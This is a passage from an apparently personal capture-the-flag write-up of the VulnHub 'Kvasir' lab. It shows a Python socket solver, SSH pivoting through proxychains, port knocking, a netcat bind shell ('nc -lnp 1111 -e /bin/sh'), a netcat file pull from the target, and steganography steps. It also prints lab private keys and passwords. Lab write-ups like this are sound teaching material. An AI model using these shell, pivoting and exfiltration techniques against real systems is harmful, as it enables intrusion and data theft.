&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains nc 192.168.3.50 4444
ProxyChains-3.1 (http://proxychains.sf.net)
Hello Celes &amp;amp; Welcome to the Jumble!

Solve:indrssoses
Solve:roneb bob
Solve:abaerrbs

[... snip ...]

Solve:iepasncm

Score: 0
Time: 22.71 secs
Just a bit embarrasing really...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Don&amp;rsquo;t think I did too well there! :D Not to fear. I recognized some of the strings after the &lt;em&gt;Solve:&lt;/em&gt; as ones that are scrambled from the previously found &lt;code&gt;.words.txt&lt;/code&gt; file. So, my guess here was that I had to write a small script that will connect to the socket and answer with the unscrambled versions from &lt;code&gt;.words.txt&lt;/code&gt;. With the &lt;code&gt;.words.txt&lt;/code&gt; file locally available, I slapped together something to try and do this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

# Kvasir Terra Puzzle Solver

import sys
import socket
import base64

# read the words.txt we got into a list
with open(&#39;words.txt&#39;) as f:
    words = f.read().splitlines()

# connection to the game
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((&#39;192.168.3.50&#39;, 4444))

# start processing the lines
while True:

    # receive a frame large enough
    frame = sock.recv(150)

    # check that its a question frame
    if &#39;Solve&#39; not in frame:
        print &amp;quot;[!] &#39;Solve&#39; not in frame. Game over?&amp;quot;
        break

    # split the frame with :
    frame = frame.split(&#39;:&#39;)
    if len(frame) &amp;lt; 2:
        print &amp;quot;[!] Was unable to split by :. Game over?&amp;quot;
        break

    question = frame[1].strip()

    # @barrebas suggested a length check too to increase probability :)
    result = [s for s in words if not s.strip(question) and len(question) == len(s)]
    #result = [s for s in words if not s.strip(question)]

    if len(result) &amp;lt; 1:
        print &amp;quot;[!] Was unable to match anything to %s&amp;quot; % question
        continue

    answer = result[0].strip()

    print &amp;quot;[+] Matched %s to %s&amp;quot; % (question, answer)
    sock.send(answer)

# did we win? \:D/
if &#39;You\&#39;re a winner&#39; in frame:
    print &amp;quot;[+] We won!&amp;quot;

    # read the rest of the socket output
    frame += sock.recv(2500)

    # base64 decode the last string
    print &amp;quot;[+] Extracing and decoding the base64 section&amp;quot;
    print base64.b64decode(frame.split(&#39;\n&#39;)[-1])
    sys.exit(0)

sock.close

# work with what we have left
print &amp;quot;[+] Last frame was:\n %s&amp;quot; % frame
print &amp;quot;[+] Done&amp;quot;
sys.exit(0)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Once you are able to get a score of 120 it seems, you are considered a winner. Once you have won, a fairly large string is output again. This string appeared to be a base64 encoded string, and as a result, I added the &lt;code&gt;base64.b64decode(frame.split(&#39;\n&#39;)[-1])&lt;/code&gt; section to the script so that if you win it will print the cleartext version.&lt;/p&gt;

&lt;p&gt;The script is not perfect. Sometimes you don’t get 120 as a score and have to run it again. But, within a reasonable amount of attempts you are able to beat the game. A sample run would be:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains ./play.py
ProxyChains-3.1 (http://proxychains.sf.net)
[+] Matched atravdeii to radiative
[+] Matched oilyaerbdmpn to imponderably

[... snip ...]
[+] Matched idmlhkeir to kriemhild
[!] &#39;Solve&#39; not in frame. Game over?
[+] We won!
[+] Extracing and decoding the base64 section
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,76841822AB9E772FD1D653F6179F0E4D

OrEM2ocnhHKg5nuH7ps1CoOJCihasmFJKLOVNNYFOhGKUojPYEta5yOhIskf0h0r
So+xVDK67G3DlgymUV3DxGfizLfZvhxQRC8Qy0mf4N+miYkvf2NaFtatpNcjK5pM
Uy6QSFMOC8aKpe0FL6UGDRJQ5GSG4DlJrLUJBMvnSLtYZHlaWAICKbXfpXV4STwv
J0D8h9RtlRJhLCK5eKgupYCQIiGQWg3PvZpXk9kkjXhmOQwUYoCRl3l4j5zlnFcT
P6U9UPhRq/Ck4Qrk2dGxFfppQd9xW+b4PWjiSCikLF3Q0hfNNvEbu4ounAgYwPFH
jOXHJqxVog/pZz9Y8XfSP3hz9AYHWfI2iC9Cnk7boRcOv+mcgEeWWkYrVscOivYj
9N2xiNp4GH+NIG8mm/Ldl7jQMl/Vrr5cx3fXjOezmgsSkAY4CcspwKsSXK8GL/bO
hT6pKWfL6UI8wUgpI7KhgK+AOKuS/XPYTSdz+0RJxNFSLOFNcjRtL+NW0UjPq5Jh
Dia+pw5qB+lllxgaN0WBQskIFQpppPowwjG8Jg8jJBjSYj3r4LIrZwJSpcvoBiUA
oCqnQUMtXlMh9/CvBBGs1+JVcjkInBde945V+ejhP6GPYju4TQV7B70d7aEW0OEm
0d7nrOW/LCYpsV/N5rqVsGlTvwjJNowyMqEZ9E09guM5eL4CEPPmp9ZDey2fBAGw
q7nSr8q6Hsf4d+YPR+90EfMJReqI3s1FQoTvx+PaFPiKw7dfHFCgLscXcXcognLz
cB0lnemI+cFmfY74F1eYL3fwJIwSRgK85Xc2My8sqJz1izj6IlO2kQ1jLkrhJOZ8
X+p/9w5zA0x2fbjppHac+YoJfyPyYXjkpigDPjHXhRit2qnUrHfDc0Fjh5AKNU2K
MU/ywXGEg6w0CppK9JBo0u/xJlhT/jOWNiM4YZjXlhQzkxyebvbyRS6Slhlo142l
gMuMUvPn1fAenir6AFwy2rlktQ5/a8z2VCwPkNA40MImSHMWRSFboDjM5zwr24Gk
N0pI1BCmCsf0msvEwLhdcVnhJY7Bg4izm5bX+ArV/ymLOkybK8chz5fryXcjeV1q
izJe2AXZk1/8hY80tvJWjxUEfnguyoozQf5T74mn5aez9JgGWMqzpfKwZ6Lx5cTg
Zu+m+ryakBPFjUtt04lCYCCKWQzPhgIr5xUFx62hCGhh6W8tSIB6k7Hpun123GQ0
uT+R0ErYA5Gdyx44FZEatZ3rXCpVmJllCTWUqBuaHYAtcZThTTZfxRFHy02IT6FW
PLCZ/XN2E+TdtkXmFcTXRsgtyA/5VXsTWWmRcHczv5g5YcQ3pHs3MhSxsWSdTz/8
RYzmxOnCjZWXaUe0Xb7FjA/evmpXsyhChGbvp0K0hZFcMeszFKa8K4pAedcyG31n
4+HhImnEpLZQOXhfXlkKMQXrBys7hkonkDp57Vqh+IIZLGzVmfTVEj2Whc/0Y+GI
DMph0ZvTG+Jgv1LO3Sl82Rzm1jUkzEIZNIxYeSGrZf6ChVLPa85axqw5EVNCxYUg
JAqg+ud6xIO9obidxzI2rLfbxcpMur80nb4crYMNm09yPQaskngK/4IjmnPLeTih
-----END RSA PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A private key? Encrypted though :( Remembering the string I got from the QR code earlier that had no affiliation to anything yet, I tried that as the password to decrypt:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:# openssl rsa -in terra_key -out terra_key_nopass
Enter pass phrase for terra_key: # entered Nk9yY31hva8q
writing RSA key

root@kali:~# cat terra_key_nopass
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyekXwhcscSSzT3vw5/eL2h1Bb55vEIOOAkQpIQQ/ldnyT6Yt
w0dAaN71JidjfojzvdaZRNrRY5wkdHUr2t93TJx8vKDZ+n5up4nCKle3p2sz2hKP
DhP7LvxkVTM7Io3qoAYXefggTOWvfoK8X8pXE3xAdIyF4uCXmDjeg6UKoCr5XiWP
12YQEODLd+tp9RH4R/rCaencsNsta45sY1NXtWuJje4HVkPV8ei04ce8SP5PwVhV
sfp2Hxr8g4IKn7ZTwtmkD1SuvmZoyDHNAsToqFt2RiVE9yLQj94Gcagx7PqUijeH
b+4T+6tuDZtjgct4RdYZejnUOYx+iHiSjl6xCQIDAQABAoIBADYOi+fQ4HsiQkeD
fUn9gpnQv1Ys6rtXHUwKB6DpTETIZxFgAlyH1Py+xI+EeCTGcctfiwVeODUc9r2f
KTCeJ4iBVPwDbJieBO4h+bPwbCEMmINH+LjiLJu1wv70il6D9E8Hkn17Ktqrm8KZ
KenTeGClIXSSsr29N5jvkNNZ+nBK116l2TNNSsiWGc3VnezgCuRnDMSuKmA4P/OD
5F/h2/1sC33P1P5zxSMMsUZbm616AXNdv2DxHYm5b7p0L3/wzpZaJ+ZCp9jutbMO
P7XADZrFSn1EOk9blfVQz77GhRUVAotXKv7Jj4x+zHjq2l3n2Jk5RwJLl8iw4vZ+
ActgrskCgYEA5RhweA1naUanRJtlnLY4ywjfpZffPOZovmthqeOYdSJmwdmKvf08
bBR7hRwwlwgD92jeZWC1nK2zjwVpVQqV3sq4+x6Yspp0T5d9hp7PqUvPGglRdPXX
JQjMBV/Q2fK+ydnTz3xImjIvGsoFya9B/COKicu5ugCklCxtdNPJd/8CgYEA4Z9c
cekfgeha7sYe202krz0m03b8IqFaEMBUkEDmr8+RTL2H+9ciu3/2y/0UJ20w3qwe
gWv2OvOmumJ2wi/HVQdoQ9purzKWDdes6QrQsZ6+4eeylQmVmBSOF9YiVudSwyBM
+2rmE4m4qAIVidIJskb6DpB+fxDU1iWFLHlUFvcCgYEArxV8buOfkp+CmjZA9AF3
agQAGCf3Xi2hA1ZBr3rXOz3tVl0RYZ21ncwRkms231Yq4dxtiwDcCz/dKIK0O1/5
pek8cf6yKF1OYr2eG1In1nSvdHCGpmJz6EPO2JSfotGX6d/ltn5/ZgjQYyLeRYMB
ZNcsu57M9FAld3B0voJVSLUCgYACac72VPUGUbLvTOU1mU4CpdfNeT9XK3yoIzaE
WH1fMgwu0vQqaHGxqbu9ENbvWQalyxeEcOAwXzzQT49Pom0yZqLh3utCKntaaI0r
7Pawf68xAWZym6ii+M1QSfUSEuVauvS317vgR5/XBDaww7Ng2cuA7mC8ATUVmU8k
W6PfnwKBgQCBapB8OxxeRoFlnctafkTqtlNU5MGgiUGCCk/NNpDJhzaBuSdxdbRB
bQ6OJjQ9fbjF24w1iOJCGTtMQ0fxer7oxoM8TblM/eYx3Dg6MwsVApP75VdqzSas
mlJnXivwgJkeju+L42BMEl4UaxuhFPBSNCmlLBPj3Hdgyh5LSyIKmw==
-----END RSA PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Considering that &lt;strong&gt;192.168.3.50&lt;/strong&gt; was named as &lt;code&gt;terra&lt;/code&gt; in that &lt;code&gt;/etc/hosts&lt;/code&gt; file, I attempted authentication using this key on it:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains ssh -D 8001 terra@192.168.3.50 -i terra_key_nopass
ProxyChains-3.1 (http://proxychains.sf.net)
Linux dev2 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Sun Nov  9 07:13:31 2014 from 192.168.3.200
terra@dev2:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As you can see, I also opened another socks proxy locally on port &lt;code&gt;tcp/8001&lt;/code&gt; in the case for any further pivoting needs. Again, to make sure we understand where in the network we are, consider the following diagram, with the path to &lt;code&gt;dev2&lt;/code&gt; in red:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_network_graph_5.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;letting-myself-in-via-the-back-door&#34;&gt;letting myself in via the back door&lt;/h2&gt;

&lt;p&gt;Enumerating &lt;code&gt;dev2&lt;/code&gt; did not reveal much interesting information. In fact, the most important clue found was in a mail for &lt;code&gt;terra&lt;/code&gt; from Locke:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;terra@dev2:~$ cat /var/spool/mail/terra
Return-path: &amp;lt;locke@192.168.4.100&amp;gt;
Received: from locke by 192.168.4.100 with local (Exim 4.80)
~       (envelope-from &amp;lt;locke@adm&amp;gt;)
~       id 1XHczw-0000V2-8y
~       for terra@192.168.3.50; Wed, 13 Aug 2014 19:10:08 +0100

Date: Wed, 13 Aug 2014 19:10:08 +0100
To: terra@192.168.3.50
Subject: Port Knock
User-Agent: Heirloom mailx 12.5 6/20/10
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-Id: &amp;lt;E1XHczw-0000V2-8y@adm&amp;gt;
From: locke@192.168.4.100
~
Hi Terra,

I&#39;ve been playing with a port knocking daemon on my PC - see if you can use that to get a shell.
Let me know how it goes.

Regards,
Locke
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Port knocking daemon eh? Admittedly at this stage again I was kinda stuck. Did I miss the sequence to knock on my way here? While wondering about this, I setup to run a port scan on &lt;strong&gt;192.168.4.100&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# /etc/proxychains.conf has line
# socks5    127.0.0.1 8001

# scans will appear to be coming from 192.168.4.50 for
# 192.168.4.100
root@kali:~# proxychains nmap -sT 192.168.4.100
ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 6.46 ( http://nmap.org ) at 2014-11-09 17:39 SAST
Nmap scan report for 192.168.4.100
Host is up (0.0018s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 1.75 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Only &lt;code&gt;tcp/22&lt;/code&gt;. :s&lt;/p&gt;

&lt;p&gt;I started working back a little bit to some of the previous machines in search for clues, but, found nothing concrete. Remembering the port knocking daemon used in &lt;a href=&#34;http://vulnhub.com/entry/knock-knock-11,105/&#34;&gt;Knock Knock&lt;/a&gt; (&lt;code&gt;knockd&lt;/code&gt;), I went and searched for its configuration file, looking for the default port sequence it is configured with. I found the config file &lt;a href=&#34;https://github.com/jvinet/knock/blob/master/knockd.conf&#34;&gt;here&lt;/a&gt;, which revealed the default sequence of: &lt;code&gt;7000,8000,9000&lt;/code&gt;. So, I tested this by attempting to connect with &lt;code&gt;nc&lt;/code&gt; to these ports on &lt;strong&gt;192.168.4.100&lt;/strong&gt;, and following up with a nmap:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;terra@dev2:~$ nc -v 192.168.4.100 7000 -w 1; nc -v 192.168.4.100 8000 -w 1; nc -v 192.168.4.100 9000 -w 1
192.168.4.100: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [192.168.4.100] 7000 (afs3-fileserver) : Connection refused
192.168.4.100: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [192.168.4.100] 8000 (?) : Connection refused
192.168.4.100: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [192.168.4.100] 9000 (?) : Connection refused
terra@dev2:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The nmap after the knock:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains nmap -sT 192.168.4.100
ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 6.46 ( http://nmap.org ) at 2014-11-09 17:45 SAST
Nmap scan report for 192.168.4.100
Host is up (0.0015s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
1111/tcp open  lmsocialserver

Nmap done: 1 IP address (1 host up) scanned in 1.71 seconds

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A new port! &lt;code&gt;tcp/1111&lt;/code&gt; :) Lets check it out.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains nc 192.168.4.100 1111
ProxyChains-3.1 (http://proxychains.sf.net)

# a new connection has no output. Only after typing
# &#39;crap&#39; do you realise you have a sh session open

id
uid=1000(locke) gid=1000(locke) groups=1000(locke)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Shell access as &lt;code&gt;locke&lt;/code&gt; on &lt;strong&gt;192.168.4.100&lt;/strong&gt;. Nice :D To help me ensure I can comprehend where I am in the network, consider the following diagram, which is turning into a mess thanks to how deep this whole is&amp;hellip; The new connection denoted in red again:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_network_graph_6.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;busting-kefka&#34;&gt;busting kefka&lt;/h2&gt;

&lt;p&gt;The shell on &lt;code&gt;adm&lt;/code&gt; as &lt;code&gt;locke&lt;/code&gt; was nothing more than a &lt;code&gt;/bin/sh&lt;/code&gt; instance executed over &lt;code&gt;netcat&lt;/code&gt;. This can be seen in the &lt;code&gt;littleShell.sh&lt;/code&gt; file in &lt;code&gt;/home/locke&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cat littleShell.sh
#!/bin/sh

/bin/nc -lnp 1111 -e &#39;/bin/sh&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Other interesting files were all in &lt;code&gt;locke&lt;/code&gt;&amp;rsquo;s home directory:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;pwd
/home/locke
ls -lh
total 332K
-rw-r--r-- 1 locke locke 322K Aug 10 10:32 diskimage.tar.gz
-rwxr--r-- 1 locke locke   42 Aug 13 17:59 littleShell.sh
-rw-r--r-- 1 locke locke  110 Sep  4 13:38 note.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code&gt;note.txt&lt;/code&gt; file:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cat note.txt
Looks like Kefka may have been abusing our removable media policy.  I&#39;ve extracted this image to have a look.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Awesome. That gives me a pretty clear idea of where this may be going. My guess was I needed to find something interesting in the &lt;code&gt;diskimage.tar.gz&lt;/code&gt; file to progress. The first thing I had to do was get a local copy of &lt;code&gt;diskimage.tar.gz&lt;/code&gt;. Out comes &lt;code&gt;netcat&lt;/code&gt; again :) I hosted the file on &lt;code&gt;tcp/4444&lt;/code&gt; on &lt;strong&gt;192.168.4.100&lt;/strong&gt; with &lt;code&gt;nc -lvp 4444 &amp;lt; diskimage.tar.gz | xxd -p&lt;/code&gt;. I then read the file on my attacking machine with &lt;code&gt;timeout 5 proxychains nc 192.168.4.100 4444 &amp;gt; diskimage.tar.gz&lt;/code&gt; (I gave the file 5 seconds to come over before killing the connection, allowing my other netcat shell to stay alive).&lt;/p&gt;

&lt;p&gt;I had to carve out the string &lt;em&gt;ProxyChains-3.1 (&lt;a href=&#34;http://proxychains.sf.net&#34;&gt;http://proxychains.sf.net&lt;/a&gt;)&lt;/em&gt; out of the archive I get locally on disk due to the proxychains command adding this. Luckily it was a simple &lt;code&gt;dd&lt;/code&gt; on the top line and it was gone :)&lt;/p&gt;

&lt;p&gt;I then extracted the archive and ran the resultant archive through &lt;code&gt;file&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# tar xvf diskimage.tar.gz
diskimage

root@kali:~# file -k diskimage
diskimage: x86 boot sector, code offset 0x3c, OEM-ID &amp;quot;MSDOS5.0&amp;quot;, sectors/cluster 2, root entries 512, Media descriptor 0xf8, sectors/FAT 238, heads 255, hidden sectors 63, sectors 122031 (volumes &amp;gt; 32 MB) , reserved 0x1, serial number 0xad6f8bf, unlabeled, FAT (16 bit) DOS executable (COM), boot code
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ok, so this really looks like a disk image. I decided to mount it and have a look inside:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# mount diskimage /mnt/

root@kali:~# ls -lah /mnt/
total 21K
drwxr-xr-x  2 root root  16K Jan  1  1970 .
drwxr-xr-x 23 root root 4.0K Sep 17 13:04 ..
-rwxr-xr-x  1 root root  118 Aug  3 12:10 Secret.rar

# oh! a .rar? Lets extract...
root@kali:~# unrar x /mnt/Secret.rar

UNRAR 4.10 freeware      Copyright (c) 1993-2012 Alexander Roshal


Extracting from /mnt/Secret.rar

Enter password (will not be echoed) for MyPassword.txt:

No files to extract
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A &lt;code&gt;.rar&lt;/code&gt; archive, but no password to extract. Aaaand again, I was stuck. My guess was there was some forensics aspect to this, and that the disk image may be more than just a disk image&amp;hellip;&lt;/p&gt;

&lt;p&gt;Some googling around got me a hit on a tool called &lt;code&gt;autopsy&lt;/code&gt;, which is a disk image analysis framework. I cared little for the case files features and what not, but much rather the actual analysis features. I fired up the tool from the Kali menu, and browsed to the web interface. I had a whole bunch of prompts to work through, and eventually came to a view that allowed me to inspect the disk:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_autospy.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;&lt;code&gt;C:/Funky.wav&lt;/code&gt;. Now that is not something I saw when I had the disk mounted :D. I downloaded the file via the &lt;em&gt;Export&lt;/em&gt; link, copied it to my laptop (my Kali doesnt have sound for whatever reason) and fired up the speakers to have a listen.&lt;/p&gt;

&lt;p&gt;It sounded like this:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_wut_sound.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Yeah, I don&amp;rsquo;t get it either. I was stumped for a few minutes again, until I remembered &lt;a href=&#34;http://vulnhub.com/entry/xerxes-201,97/&#34;&gt;Xerxes2&lt;/a&gt;, which has a similar strange sounding file, but with a hidden message viewable via a spectrogram generated by &lt;a href=&#34;http://www.sonicvisualiser.org/index.html&#34;&gt;Sonic Visualizer&lt;/a&gt;. I downloaded the app, loaded the wav file and got the spectrogram to do its thing:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_sonic_viz.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;&lt;em&gt;OrcWQi5VhfCo&lt;/em&gt;. Was this the password for the &lt;code&gt;.rar&lt;/code&gt; archive?&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# unrar x /mnt/Secret.rar

UNRAR 4.10 freeware      Copyright (c) 1993-2012 Alexander Roshal


Extracting from /mnt/Secret.rar

Enter password (will not be echoed) for MyPassword.txt:

Extracting  MyPassword.txt                                            OK
All OK
root@kali:~# cat MyPassword.txt
5224XbG5ki2C
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yep! However, another random string. Remembering the note about this being a disk image from &lt;code&gt;kefka&lt;/code&gt;, I attempted to SSH into &lt;strong&gt;192.168.4.100&lt;/strong&gt; as &lt;code&gt;kefka&lt;/code&gt; with this password:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains ssh -D 8002 kefka@192.168.4.100
ProxyChains-3.1 (http://proxychains.sf.net)
kefka@192.168.4.100&#39;s password: # entered 5224XbG5ki2C
Linux adm 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Nov  9 07:14:02 2014 from 192.168.4.50
kefka@adm:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A final &lt;code&gt;tcp/8002&lt;/code&gt; proxy was opened on my attacking machine.&lt;/p&gt;

&lt;h2 id=&#34;taking-the-last-ride-to-the-flag&#34;&gt;taking the last ride to the flag&lt;/h2&gt;

&lt;p&gt;Enumeration as kefka revealed that this user is allowed to run &lt;code&gt;/opt/wep2.py&lt;/code&gt; as root. This is almost screaming at me as the privilege escalation path!&lt;/p&gt;

&lt;p&gt;I ran the script with sudo, just to be presented with&amp;hellip; nothing :/ No matter what I typed in, I received no output. That was until I ^C the application and receive a traceback, hinting towards the fact that it may have opened a socket:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kefka@adm:~$ sudo /opt/wep2.py
^CTraceback (most recent call last):
  File &amp;quot;/opt/wep2.py&amp;quot;, line 93, in &amp;lt;module&amp;gt;
    sock, addr = s.accept()
  File &amp;quot;/usr/lib/python2.7/socket.py&amp;quot;, line 202, in accept
    sock, addr = self._sock.accept()
KeyboardInterrupt
kefka@adm:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I re-run the script backgrounding it with &lt;code&gt;&amp;amp;&lt;/code&gt;, and inspect the output of &lt;code&gt;netstat -pant&lt;/code&gt; to reveal a port 1234 to be open. From my attacking machine, I connected to the socket using proxychains on the new &lt;code&gt;tcp/8002&lt;/code&gt; proxy. The 127.0.0.1 is in fact 192.168.4.100 and not my actual localhost:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# /etc/proxychains.conf has line
# socks5    127.0.0.1 8002

# connections will appear to be coming from localhost
root@kali:~# proxychains nc -v 127.0.0.1 1234
ProxyChains-3.1 (http://proxychains.sf.net)
127.0.0.1: inverse host lookup failed:
(UNKNOWN) [127.0.0.1] 1234 (?) open : Operation now in progress
=============================
Can you retrieve my secret..?
=============================

Usage:
&#39;V&#39; to view the encrypted flag
&#39;E&#39; to encrypt a plaintext string (e.g. &#39;E AAAA&#39;)

V
5a5062:36507a63b56865f7fd201860
^C
root@kali:~#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We are presented with yet another &lt;em&gt;game&lt;/em&gt;, this time, something completely different. I played a little with the output, attempting to escape the environment. Most input would be picked up as invalid input, and the &lt;code&gt;netcat&lt;/code&gt; connection killed, causing me to have to re-run &lt;code&gt;sudo /opt/wep2.py&lt;/code&gt; on the kefka session.&lt;/p&gt;

&lt;p&gt;By now, I was pretty exhausted from everything Kvasir has thrown at me and the rabbit hole has become pretty deep and dark. From testing the above game, I guessed that the output for commands were &lt;code&gt;salt:cyphertext&lt;/code&gt;, which changes for anything you throw at it. Furthermore, the game allows you to encrypt known clear text. As a test, I tested with &lt;em&gt;A&lt;/em&gt;, and studied the output:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;E A
348bbc:8d
E A
f2fb0c:6e
E A
64d7fb:2d
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Assuming the first part is the salt, my text is encrypted and presented as a single hex byte. Other than that, I am not really sure what my attack vectors are, if any.&lt;/p&gt;

&lt;p&gt;Taking it easy for a while, I had a chat to @barrebas on how far I am with Kvasir, when he mentioned that the filename &lt;code&gt;wep2.py&lt;/code&gt; should be taken as a hint!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;This had to be the hardest part of the entire challenge for me personally. The largest part of this was spent reading reading reading and more reading! Ofc, this is also my biggest take from Kvasir :)&lt;/em&gt;&lt;/p&gt;

&lt;h3 id=&#34;understanding-what-wep-actually-is&#34;&gt;understanding what WEP actually is&lt;/h3&gt;

&lt;p&gt;With the limited interaction I have had with the last game, and the hint &lt;code&gt;wep2&lt;/code&gt;, I set out to test my Google-fu. I know there is no such thing as WEP2, but there is WPA2. So the first part was to determine if the hint is something like WEP or WPA2.&lt;/p&gt;

&lt;p&gt;Some resources that really helped me get to grips with what we are facing here was:
 &lt;a href=&#34;http://www.isaac.cs.berkeley.edu/isaac/mobicom.pdf&#34;&gt;http://www.isaac.cs.berkeley.edu/isaac/mobicom.pdf&lt;/a&gt;
 &lt;a href=&#34;http://www.csee.umbc.edu/courses/graduate/CMSC628/spring2002/ppt/kunjan.ppt&#34;&gt;http://www.csee.umbc.edu/courses/graduate/CMSC628/spring2002/ppt/kunjan.ppt&lt;/a&gt;
 &lt;a href=&#34;http://www.cs.berkeley.edu/~daw/talks/HPColloq03.ppt&#34;&gt;http://www.cs.berkeley.edu/~daw/talks/HPColloq03.ppt&lt;/a&gt;
 &lt;a href=&#34;http://www.cs.unb.ca/~ken/papers/cnsr2004.pdf&#34;&gt;http://www.cs.unb.ca/~ken/papers/cnsr2004.pdf&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Of the above list, I highly recommend you check out the &lt;code&gt;.ppt&lt;/code&gt;&amp;rsquo;s. As lame as it may seem, it really helped me just over the cliff into understanding what I was facing here and what the fundamental problem is that I should be exploiting.&lt;/p&gt;

&lt;p&gt;The reading on WPA revealed that a encrypted packet is determined similar to a RC4 stream cipher is. Let &lt;em&gt;C&lt;/em&gt; be the cipher text and &lt;em&gt;P&lt;/em&gt; be the plain text. A publicly known Initialization Vector and a Secret Key as a function of RC4 is ^ (XOR&amp;rsquo;d) with the plaintext to produce the cipher text. Typically, this is represented as:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;C = P ^ RC4(iv, k)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With that now known, we can learn about vulnerabilities in this algorithm. More specifically, about &lt;a href=&#34;http://en.wikipedia.org/wiki/Stream_cipher_attack&#34;&gt;Stream Cipher Attacks&lt;/a&gt; and &lt;a href=&#34;http://en.wikipedia.org/wiki/Related-key_attack&#34;&gt;Related Key Attacks&lt;/a&gt;. With all of the knowledge gained with close to 6 hours of almost straight googling, I was ready to get going at trying something.&lt;/p&gt;

